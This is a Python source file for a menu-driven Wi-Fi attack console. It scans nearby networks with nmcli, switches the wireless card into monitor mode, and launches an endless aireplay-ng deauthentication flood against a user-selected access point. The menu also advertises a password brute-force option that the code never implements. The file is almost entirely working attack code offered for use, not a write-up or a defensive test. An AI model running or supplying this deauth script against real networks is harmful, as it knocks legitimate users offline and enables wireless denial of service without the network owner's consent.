import subprocess
from subprocess import *
from imports import *
import random

color = Colors()
logo = random.choice(logos)

def StopMonitoringMode():
    call([ "sudo", "airmon-ng", "stop", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "systemctl", "start", "NetworkManager" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "ifconfig", "wlan0", "down" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "iwconfig", "wlan0", "mode", "managed" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "ifconfig", "wlan0", "up" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "systemctl", "start", "NetworkManager" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "systemctl", "restart", "NetworkManager" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "echo", f"{color.yellow}! MONITOR MODE DISBLED !" ])
    call([ "echo", f"{color.green}WIFI ENABLED" ])

def StartDeauthAttack():
    call([ "echo", deauth_logo ])
    result = subprocess.run([ "nmcli", "dev", "wifi" ], capture_output=True, text=True)
    result = result.stdout
    result = result.replace('*', ' ')
    if(len(result.split('\n')) < 3):
        print(f"{color.red}YOU NEED TO DISABLE MONITORING MODE BEFORE RUNNING THIS OPTION. {color.blue}OPTION 2{color.white}")
        return 0
    count = 0
    for line in result.split('\n'):
        if(count == 0):
            print(f"\t{color.yellow}ID{color.white} " + line.replace('CHAN', F'{color.yellow}CHAN{color.white}').replace('IN-USE', '      '))
        elif(count+1 == len(result.split('\n'))):
            print('')
            break
        else:
            if(count-1 < 10):   
                print(f"\t{count-1}  {color.blue}{line}{color.white}")
            else:
                print(f"\t{count-1} {color.blue}{line}{color.white}")
        count+=1
    result = result.replace('        ', '')

    MACs = []

    for line in result.split('\n'):
        MACs.append(line.split(' ')[0])

    MACs.pop(0)
    while True:
        try:
            ID = input(f"Enter WiFi {color.yellow}ID{color.white}: ")
            if(ID == "exit"):
                return 0
            else:
                try:
                    ID = int(ID)
                except:
                    call([ "echo", f"\n{color.red}Invalid ID{color.white}. If you want to exit type{color.red} exit{color.white}.\n" ])
                    continue
            if (ID < len(MACs)-1 and ID > -1):
                break
            else:
                print(f"\n{color.red}Invalid ID{color.white}\n")
        except:
            call([ "echo", f"\n\n{color.red}Invalid ID{color.white}. If you want to exit type{color.red} exit{color.white}.\n" ])

    while True:
        try:
            CH = input(f"Enter WiFi {color.yellow}CHAN{color.white}: ")
            if(CH == "exit"):
                return 0
            else:
                try:
                    CH = int(CH)
                except:
                    call([ "echo", f"\n{color.red}Invalid CHANNEL{color.white}. If you want to exit type{color.red} exit{color.white}.\n" ])
                    continue
            if("  " + str(CH) in result.split('\n')[ID+1]):
                break
            else:
                print(f"\n{color.red}Invalid CHANNEL{color.white}\n")
        except:
            call([ "echo", f"\n\n{color.red}Invalid CHANNEL{color.white}. If you want to exit type{color.red} exit{color.white}.\n" ])

    call([ "sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "service", "NetworkManager", "restart" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "airmon-ng", "start", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "echo", f"{color.yellow}! DEVICE ENTERED MONNITOR MODE !" ])

    call([ "sudo", "iwconfig", "wlan0", "channel", str(CH) ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    call([ "echo", f"{color.green}ATTACK STARTED!" ])
    call([ "echo", f"To stop the attack just press {color.red}Ctrl+C{color.white}.\n" ])
    
    call([ "echo", f"{color.blue}WIFI IS DOWN{color.white}" ])
    call([ "echo", f"sudo aireplay-ng -0 0 -a {MACs[ID]} wlan0{color.red}" ])
    call([ "sudo", "aireplay-ng", "-0", "0", "-a", MACs[ID], "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    
def StartUpScreen():
    call([ "clear" ])
    call([ "echo", logo ])
    call([ "echo", f"{color.nocolor}Options:" ])
    call([ "echo", f"\t{color.red}1){color.yellow} Start the deauth attack." ])
    call([ "echo", f"\t{color.red}2){color.yellow} Stop Monitoring mode." ])
    call([ "echo", f"\t{color.red}3){color.yellow} Brutte force password." ])

def HelpScreen():
    call([ "echo", helpScreenString ])


StartUpScreen()
while True:
    try:
        command = str(input(f"\n{color.nocolor}console> "))
    except:
        print(f"\nTo exit type {color.red}exit{color.white}.")
        continue
    
    if(command == '1'):
            StartDeauthAttack()
        
    elif(command == '2'):
        StopMonitoringMode()
    
    elif(command == 'clear'):
        StartUpScreen()

    elif(command == 'fullclear'):
        call([ "clear" ])
    
    elif(command == 'help'):
        HelpScreen()
    
    elif(command == 'exit'):
        break

    else:
        print(f"{color.red}!{color.white} Invalid Option {color.red}!{color.white}")

